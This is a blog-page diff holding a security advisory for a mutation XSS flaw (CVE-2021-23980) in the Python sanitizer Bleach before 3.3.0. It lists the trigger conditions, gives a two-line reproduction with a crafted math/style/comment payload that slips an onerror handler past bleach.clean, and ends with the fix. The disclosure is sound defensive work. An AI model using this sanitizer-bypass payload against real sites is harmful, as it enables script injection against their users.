@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="Security research blog">
+    <meta property="og:type" content="website">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        Mutation XSS in Mozilla-bleach using comments - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 16px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Product"><span class="toc-text">Product</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impact"><span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-to-reproduce"><span class="toc-text">Steps to reproduce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Expected-result"><span class="toc-text">Expected result:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation"><span class="toc-text">Remediation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credit"><span class="toc-text">Credit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        Mutation XSS in Mozilla-bleach using comments    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2021-01-31 23:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#python" title="python">python</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#mozilla" title="mozilla">mozilla</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#xss" title="xss">xss</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#mxss" title="mxss">mxss</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+        <span class="attr">/
+        
+        <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-23980" title="CVE-2021-23980">CVE-2021-23980</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+            <a target="_blank" rel="noopener" href="https://advisory.checkmarx.net/advisory/CX-2021-4303/">Source</a>
+        
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Affected versions of Mozilla-bleach are vulnerable to Mutation XSS (mXSS) vulnerability when calling bleach.clean with:</p>
+<ul>
+<li><code>svg</code> or <code>math</code> allowed </li>
+<li><code>p</code> or <code>br</code> allowed</li>
+<li>one of the RCDATA tags allowed:<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">script</span></span><br><span class="line">noscript</span><br><span class="line">style</span><br><span class="line">noframes</span><br><span class="line">xmp</span><br><span class="line">noembed</span><br><span class="line">iframe</span><br></pre></td></tr></table></figure></li>
+<li>and the argument <code>strip_comments=False</code></li>
+</ul>
+<h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>Bleach before 3.3.0.</p>
+<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>According to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.</p>
+<h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> bleach</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">bleach.clean(<span class="string">&#x27;&lt;math&gt;&lt;/p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src/onerror=alert(1)&gt;&#x27;</span>, tags=[<span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;style&#x27;</span>], strip_comments=<span class="literal">False</span>)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p><code>&lt;math&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src/onerror=alert(1)&gt;--&gt;&lt;/style&gt;&lt;/math&gt;</code></p>
+<h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update bleach dependency to 3.3.0 or above.</p>
+<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a target="_blank" rel="noopener" href="https://www.twitter.com/ynizry">Yaniv Nizry</a>.</p>
+<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-vv2x-vrpj-qqpq">Advisory</a></li>
+<li>Commit <a target="_blank" rel="noopener" href="https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13">79b7a3c</a></li>
+</ol>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
